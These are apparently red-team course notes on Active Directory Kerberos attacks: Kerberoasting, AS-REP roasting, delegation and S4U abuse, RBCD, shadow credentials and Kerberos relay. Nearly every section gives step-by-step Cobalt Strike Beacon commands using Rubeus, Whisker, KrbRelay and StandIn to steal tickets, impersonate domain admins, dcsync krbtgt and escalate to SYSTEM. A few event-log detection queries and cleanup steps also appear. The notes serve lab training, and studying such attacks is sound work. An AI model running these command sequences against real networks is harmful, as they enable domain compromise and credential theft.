# Kerberos

When a user logs onto their workstation it sends an AS-REQ to the Key Distribution Center (KDC)/Domain Controller (DC), requesting a TGT using a secret key derived from the user's password. KDC verifies the secret key with the password it has stored in Active Directory for that user. If valid it returns the TGT. The TGT contains the user's identity and is encrypted with the KDC secret key (the krbtgt account). When the user attempts to access a resource using Kerberos (e.g. a file share), the client looks up the associated Service Principal Name (SPN), and requests a Ticket Granting Service Ticket (TGS) for that service from the KDC, and presents its TGT as a means of proving they're valid. The KDC returns a TGS for the service, which is then presented to the actual service. The service inspects the TGS and decides whether it should grant the user access.

| Client | | KDC | | Server |
|:--:|:--:|:--:|:--:|:--:|
| Request TGT (AS-REQ) | -> | • | | |
| • | <- | Return TGT (AS-REP) |  |  |
| Request TGS for service (TGS-REQ) | -> | • | | |
| • | <- | Return TGs (TGS-REP) |  |  |
| Present TGS to service | -> | -> | -> | • |
| • | <- | <- | <- | Grant access |

## Kerberoasting

Services run on a machine under the context of a user account; local (LocalSystem, LocalService, NetworkService) or domain accounts (e.g. DOMAIN\mssql). A Service Principal Name (SPN) is a unique identifier of a service instance. SPNs are used with Kerberos to associate a service instance with a logon account, and are configured on the User Object in AD (e.g. MSSQLSvc.sql-2.dev.corp.io:1433 in the service's properties).

Part of the TGS returned by the KDC is encrypted with a secret derived from the password of the user account running that service. Kerberoasting requests TGSs for services running under the context of domain accounts and cracks them offline to reveal their plaintext passwords. Rubeus Kerberoast can be used to perform the kerberoasting. Running it without further arguments will roast every account in the domain that has an SPN (excluding krbtgt). 

```beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /simple /nowrap``` returns long hashes which can be cracked offline to recover the plaintext passwords for the accounts. Use:

* ```john --format=krb5tgs --wordlist=wordlist hashes``` or
* ```hashcat -a 0 -m 13100 hashes wordlist```

...but some hash format incompatibility with john. Remove the SPN from: 

    $krb5tgs$23$*mssql_svc$dev.cyberbotic.io$MSSQLSvc...

to: 

    $krb5tgs$23$*mssql_svc$dev.cyberbotic.io...


But, honeypot accounts can be configured with a "fake" SPN, which will generate a 4769 event when roasted. Since these events will never be generated for this service, it provides a high-fidelity indication of this attack: ```event.code: 4769 and winlog.event_data.ServiceName: honey_svc```. Safer to enumerate candidate users first and roast them selectively. This LDAP query will find domain users who have an SPN set: 

    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName

Then roast an individual account: ```execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap```

## ASREP Roasting

If a user does not have Kerberos pre-authentication enabled, an AS-REP can be requested for that user, and part of the reply can be cracked offline for the plaintext password. This is enabled on the User Object, often seen on Linux accounts. 

Of course don't asreproast every account in the domain: 

    execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
    execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap

Use:

* ```john --format=krb5asrep --wordlist=wordlist squid_svc``` or
* ```hashcat -a 0 -m 18200 squid_svc wordlist```

Catch: ASREPRoasting generates a 4768 event with RC4 encryption and a preauth type of 0:

    event.code: 4768 and winlog.event_data.PreAuthType: 0
    winlog.event_data.TicketEncryptionType: 0x17


## Unconstrained Delegation

Delegation allows a user or machine to act on behalf of another user to another service (e.g. user authenticates to a front-end web app that serves a back-end database -- the app authenticates to the DB using Kerberos as the authenticated user). When set up, unconstrained delegation makes KDC include the user's TGT inside the TGS. In this example, when the user accesses the Web Server, it caches the user's TGT. When the Web Server needs to access the DB Server on behalf of that user, it uses the TGT to request a TGS for the database service. It will cache the user’s TGT regardless of which service is being accessed by the user. So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their TGT will be cached and can be extracted memory for nefarious use against other services in the domain.

Enabling unconstrained or constrained delegation on a computer requires SeEnableDelegationPrivilege user rights on domain controllers, which is only granted to enterprise and domain admins. Constrained delegation is configured on the "front-end" service via its msDS-AllowedToDelegateTo attribute. This allows a computer account to impersonate any user to any service on a DC, and the DC has no "say" over it.

To return all computers that are permitted for unconstrained delegation: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname```

Domain Controllers are always permitted for unconstrained delegation.

If we compromise WEB$ and wait or socially engineer a privileged user to interact with it, we can steal their cached TGT.  Interaction can be via any Kerberos service, so something as simple as dir \\web\c$ is enough. Rubeus triage will show all the tickets that are currently cached. TGTs can be identified by the krbtgt service.

    beacon> getuid
    [*] You are NT AUTHORITY\SYSTEM (admin)
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage

Extract this TGT and leverage it via a new logon session:

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x14794e /nowrap
    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
    beacon> steal_token 1540
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

For the lab: A task running on Workstation 1 as nlamb interacts with WEB$ every 5 minutes. If the ticket is not there, wait and try again.

Can also get a TGT for accounts by forcing them to authenticate remotely to the machine. (See the NTLM Relaying module in  Pivoting for tools for this.) This time, force the domain controller to authenticate to the web server to steal its TGT. Also use Rubeus' monitor command, which continuously monitors for and extract new TGTs as they get cached. It's a superior strategy when compared to running triage manually because there's little chance of us not seeing or missing a ticket.

    beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap

then run SharpSpoolTrigger:

    beacon> execute-assembly SharpSpoolTrigger.exe dc-2.dev.cyberbotic.io web.dev.cyberbotic.io

Where:

  * DC-2 is the target
  * WEB is the listener

Rubeus will then capture the ticket. To stop Rubeus, use the jobs and jobkill commands.

Machine TGTs are leveraged slightly differently -- see S4U2Self Abuse later.  

## Constrained Delegation

Constrained delegation is a safer means for services to perform Kerberos delegation. It aims to restrict the services to which the server can act on behalf of a user. The server cannot cache the TGTs of other users, but can request a TGS for another user with its own TGT. Search for both user accounts as well as computer accounts doing this.

For example: SQL-2 can act on behalf of any user to the cifs service on DC-2 (CIFS allows you to list file shares and transfer files). To find computers configured for constrained delegation, search for those whose  msds-allowedtodelegateto attribute is not empty: ```execute-assembly ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json```

1: To perform the delegation, get the TGT of the trusted principal; extract it with Rubeus dump:

    beacon> run hostname
    beacon> getuid
    beacon> execute-assembly Rubeus.exe triage
    beacon> execute-assembly Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

2: With the TGT, perform an S4U request to obtain a usable TGS for CIFS on DC-2. Want someone who is local admin on the target or a domain admin. This will perform an S4U2Self first and then an S4U2Proxy:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:<user> /msdsspn:<service> user:<delegation> ticket:<user ticket> /nowrap

e.g.:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io user:sql-2$ /ticket:doIFLD... /nowrap

3: Use the final S4U2Proxy ticket for a new logon session, e.g.:

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGa...
    beacon> steal_token 5540
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

Rubeus asktgt also works if have NTLM or AES hashes.

Always use the FQDN. Otherwise, there will be 1326 errors:

    beacon> ls \\dc-2\c$
    [-] could not open \\dc-2\c$\*: 1326 - ERROR_LOGON_FAILURE

## Alternate Service Name

The CIFS service is good for grabbing files, but if port 445 is blocked or for lateral movement, can abuse the alt svc name feature (confirmed as "by design" by Microsoft).

In the Kerberos authentication protocol, a service validates an inbound ticket by checking that service's symmetric key. This key is derived from the password hash of the principal running the service. Most services run in the SYSTEM context of a computer account, e.g. SQL-2$. Therefore, all service tickets will be encrypted with the same key. The SPN does not factor into ticket validation. The SPN information in the ticket (i.e. the sname field) is not encrypted and can be changed arbitrarily. So we can request a service ticket for a service but then modify the SPN to a different service and the target service will accept it.

Use /altservice in Rubeus. This example uses the same TGT for SQL-2 to request a TGS for LDAP instead of CIFS:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io altservice:ldap /user:sql-2$ /ticket:doIFpD... /nowrap
    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV username:nlamb /password:FakePass /ticket:doIGaD...
    beacon> steal_token 2580

LDAP service allows performing dcsync against a domain controller:

    beacon> dcsync dev.cyberbotic.io DEV\krbtgt

## S4U2Self Abuse

As above, there are two S4U (Service for User) extensions:

* S4U2Self (Service for User to Self) - service obtains a TGS to itself on behalf of a user
* S4U2Proxy (Service for User to Proxy) - service obtains a TGS on behalf of a user to a second service

In abusing constrained delegation above, Rubeus first builds an S4U2Self request and obtains a TGS for nlamb to sql-2/dev.cyberbotic.io; then builds an S4U2Proxy request to obtain a TGS for nlamb to cifs/dc-2.dev.cyberbotic.io. This is working by design because SQL-2 is specifically trusted for delegation to that service.

Another way to abuse the S4U2Self extension is to gain access to a computer with its TGT. In the Unconstrained Delegation module, we obtained a TGT for the domain controller. Passing that to a logon session and accessing the C$ share would fail. 

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:DC-2$ /password:FakePass /ticket:doIFuj...
    beacon> steal_token 2832
    beacon> ls \\dc-2.dev.cyberbotic.io\c$
    [-] could not open \\dc-2.dev.cyberbotic.io\c$\*: 5 - ERROR_ACCESS_DENIED

Machines do not get remote local admin access to themselves. Instead abuse S4U2Self to obtain a usable TGS as a user we know is a local admin (e.g. a domain admin). Rubeus has a /self flag for this:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj... /nowrap
    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFyD...
    beacon> steal_token 2664
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

## Resource-Based Constrained Delegation (RBCD)

Windows 2012 introduced a new type of delegation called resource-based constrained delegation (RBCD), which allows the delegation configuration to be set on the target rather than the source. 

RBCD reverses the above attacks and puts control in the hands of the "backend" service instead, via a new attribute called msDS-AllowedToActOnBehalfOfOtherIdentity. This attribute does not require SeEnableDelegationPrivilege to modify. Instead, you only need a privilege like WriteProperty, GenericAll, GenericWrite or WriteDacl on the computer object, much more available for privilege escalation / lateral movement attacks.

The two prerequisites to pull off the attack are:

* A target computer on which you can modify msDS-AllowedToActOnBehalfOfOtherIdentity
* Control of another principal that has an SPN

This will obtain every domain computer and read their ACL, filtering on the interesting rights. The example shows that the Developers group has WriteProperty rights on all properties (see the ObjectAceType) for DC-2:

    beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" }
    beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107
    DEV\Developers

1: One way to get a principal with an SPN is to use a computer account. Since we have elevated privileges on Workstation 2, we can use that. To start the attack, we need its SID:

    beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties objectSid

2: Use this inside an SDDL to create a security descriptor. The content of msDS-AllowedToActOnBehalfOfOtherIdentity must be in raw binary format:

    $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"
    $rsdb = New-Object byte[] ($rsd.BinaryLength)
    $rsd.GetBinaryForm($rsdb, 0)

3: These descriptor bytes can then be used with Set-DomainObject. When working through CS, everything has to be concatenated into a single PowerShell command:

    beacon> powershell $rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-569305411-121244042-2357301523-1109)"; $rsdb = New-Object byte[] ($rsd.BinaryLength); $rsd.GetBinaryForm($rsdb, 0); Get-DomainComputer -Identity "dc-2" | Set-DomainObject -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity' = $rsdb} -Verbose
    beacon> powershell Get-DomainComputer -Identity "dc-2" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity

4: Use the WKSN-2$ account to perform the S4U impersonation with Rubeus.  The s4u command requires a TGT, RC4 or AES hash.  Since we already have elevated access to it, we can just extract its TGT from memory.

    beacon> execute-assembly Rubeus.exe triage
    beacon> execute-assembly Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

5: Perform the s4u:

    beacon> execute-assembly Rubeus.exe s4u /user:WKSTN-2$ /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /ticket:doIFuD... /nowrap

6: pass the ticket into a logon session for use:

    beacon> execute-assembly Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIGcD...
    beacon> steal_token 4092
    beacon> ls \\dc-2.dev.cyberbotic.io\c$

To clean up, remove the msDS-AllowedToActOnBehalfOfOtherIdentity entry on the target:

    beacon> powershell Get-DomainComputer -Identity dc-2 | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity

### No LA

Without local admin, create your own computer object. By default, even domain users can join up to 10 computers to a domain, controlled via the ms-DS-MachineAccountQuota attribute of the domain object.

    beacon> powershell Get-DomainObject -Identity "DC=dev,DC=cyberbotic,DC=io" -Properties ms-DS-MachineAccountQuota

[StandIn](https://github.com/FuzzySecurity/StandIn),a post-exploit toolkit, has the functionality to create a computer with a random password:

    beacon> execute-assembly StandIn.exe --computer EvilComputer --make

Rubeus hash can take the password and calculate hashes:

    PS C:\Users\Attacker> Rubeus.exe hash /password:oIrpupAtF1YCXaw /user:EvilComputer$ /domain:dev.cyberbotic.io

which can be used with asktgt to obtain a TGT for the fake computer:

    beacon> execute-assembly Rubeus.exe asktgt /user:EvilComputer$ /aes256:7A79... /nowrap

(rest of the attack is the same).

## Shadow Credentials

Kerberos pre-authentication is typically carried out using a symmetric key derived from a client's password, but asym keys are also possible for Initial Authentication (PKINIT). If a PKI solution is in place, such as Active Directory Certificate Services, the domain controllers and domain members exchange their public keys via the appropriate CA (Certificate Trust model). Also Key Trust model, where trust is established based on raw key data, not a certificate. This requires a client to store their key on their own domain object, in an attribute called msDS-KeyCredentialLink. The basis of the "shadow credentials" attack is that if you can write to this attribute on a user or computer object, you can obtain a TGT for that principal. As such, this is a DACL-style abuse as with RBCD.

[Whisker](https://github.com/eladshamir/Whisker) eases exploiting this:

1: List any keys that might already be present for a target -- essential for cleaning up later.

    beacon> execute-assembly Whisker.exe list /target:dc-2$

2: Add a new key pair to the target:

    beacon> execute-assembly Whisker.exe add /target:dc-2$

3: Ask for a TGT using the Rubeus command that Whisker provides:

    beacon> execute-assembly Rubeus.exe asktgt /user:dc-2$ /certificate:MIIJuA... /password:"y52Eh..." /nowrap

Whisker's clear command removes all keys from msDS-KeyCredentialLink. Bad idea if a key was already present; just list the entries again and only remove the one you made:

    beacon> execute-assembly Whisker.exe list /target:dc-2$
    beacon> execute-assembly Whisker.exe remove /target:dc-2$ /deviceid:58d0c...

## Kerberos Relay Attacks

Can also relay Kerberos authentication in a Windows domain without MitM. One challenge in relaying Kerberos is that service tickets are encrypted with the service's secret key (a ticket for CIFS/HOST-A cannot be relayed to CIFS/HOST-B because HOST-B would be unable to decrypt a ticket that was encrypted for HOST-A). However, in Windows, the service's secret key is derived from the principal associated with its SPN and is not necessarily unique for each service. Most services run as the local SYSTEM, i.e. the computer account in Active Directory. So service tickets for services run on the same host, such as CIFS/HOST-A and HTTP/HOST-A, would be encrypted with the same key.

There's nothing stopping Kerberos authentication being relayed if the attacker can control the SPN. If signing or channel binding are enabled, these attacks are not possible.

[The DCOM Authentication method](https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html) is similar to how the [RemotePotato](https://github.com/antonioCoco/RemotePotato0) exploit works: stand up a local listener and coerce a privileged COM server into connecting to it; capture the subsequent authentication request and relay it somewhere else. The attacker starts a malicious RPC server that forces connecting clients to authenticate to it using Kerberos only, and by using appropriate security bindings, they can specify a completely arbitrary SPN. This forces a service ticket to be generated for a service/SPN that that attacker doesn't control, such as HOST/DC. They then coerce a privileged COM server into connecting to their malicious RPC server, which authenticates and generates the appropriate Kerberos tickets. In this example, the malicious RPC server would receive a KRB_AP_REQ for HOST/DC as the local computer account, which the attacker can relay to LDAP/DC instead. With a valid service ticket for LDAP, they can submit requests to the DC as the computer account to modify the computer object in Active Directory. This opens the door for other attacker primitives like RBCD and shadow credentials in order to achieve the LPE. 

Tools like [KrbRelayUp](https://github.com/ShorSec/KrbRelayUp) automates most of the exploitation steps. 

For the lab, do the steps manually to understand all of the steps in detail and to know how and what to clean-up (which tools often omit). For the relaying, use the original [KrbRelay](https://github.com/cube0x0/KrbRelay); for the LPE, tools we're already familiar with including StandIn, Whisker, and Rubeus. This lesson shows how Kerberos relaying can be used to LPE to SYSTEM on WKSTN-2 as bfarmer.

KrbRelay is larger than the default size allowed for Beacon (it uses the large BouncyCastle). Modify Beacon's task size to make it larger: the tasks_max_size setting in Malleable C2 (cannot be applied to existing beacons). To double it, add ```set tasks_max_size "2097152";``` to the top of the C2 profile (results in more lag in the CS client with large tasks). Restart the team server and re-generate payloads after making changes to the Malleable C2 profile.

### RBCD

Need to have control over another computer object to abuse. 

1: Easiest way is to add your own computer object to the domain and get its SID:

    beacon> execute-assembly StandIn.exe --computer EvilComputer --make
    beacon> powershell Get-DomainComputer -Identity EvilComputer -Properties objectsid

2: Find a suitable port for the OXID resolver to circumvent a check in the Remote Procedure Call Service (RPCSS); can be done with CheckPort in KrbRelay:

    beacon> execute-assembly CheckPort.exe
    [*] Looking for available ports..
    [*] SYSTEM Is allowed through port 10

3: Run KrbRelay:

    beacon> execute-assembly KrbRelay.exe -spn <target svc> -clsid <RPC_C_IMP_LEVEL_IMPERSONATE> -rbcd <SID of fake computer account> -port <port>
    e.g.: beacon> execute-assembly KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f1... -rbcd S-1-5-21... -port 10

Query the Relaying context client returned by KrbRelay to see a new entry in in its msDS-AllowedToActOnBehalfOfOtherIdentity attribute.

    beacon> powershell Get-DomainComputer -Identity wkstn-2 -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
    msds-allowedtoactonbehalfofotheridentity
    ----------------------------------------
    {1, 0, 4, 128...}

4: Request a TGT and perform an S4U to obtain a usable service tickets for WKSTN-2 using the password associated with EvilComputer (do _not_ use the FQDN in the msdsspn parameter here):

    beacon> execute-assembly Rubeus.exe asktgt /user:EvilComputer$ /aes256:1DE19... /nowrap
    beacon> execute-assembly Rubeus.exe s4u /user:EvilComputer$ /impersonateuser:Administrator /msdsspn:host/wkstn-2 /ticket:doIF8j... /ptt

5: To elevate, use this ticket on the local Service Control Manager over Kerberos to create and start a service binary payload. To streamline this, I've created a BOF and Aggressor Script (in C:\Tools\SCMUACBypass) that registers a new elevate command in Beacon:

    beacon> elevate svc-exe-krb tcp-local

## Shadow Credentials

Use shadow credentials over RBCD to avoid adding a fake computer to the domain. 

1: Verify that WKSTN-2 has nothing in its msDS-KeyCredentialLink attribute:

    beacon> execute-assembly Whisker.exe list /target:wkstn-2$

2: Run KrbRelay as before, but with the -shadowcred parameter:

    beacon> execute-assembly KrbRelay.exe -spn ldap/dc-2.dev.cyberbotic.io -clsid 90f1... -shadowcred -port 10

If get an authentication service is unknown error, reboot the machine or wait for the next clock sync.

KrbRelay provides a full Rubeus command that requests a TGT for WKSTN-2. However, it will return an RC4 ticket. For AES:

    beacon> execute-assembly Rubeus.exe asktgt /user:WKSTN-2$ /certificate:MIIJyA... /password:"06ce..." /enctype:aes256 /nowrap

The S4U2Self trick can then be used to obtain a HOST service ticket as with RBCD:

    beacon> execute-assembly Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/wkstn-2 /user:wkstn-2$ /ticket:doIGkD... /ptt
    beacon> elevate svc-exe-krb tcp-local

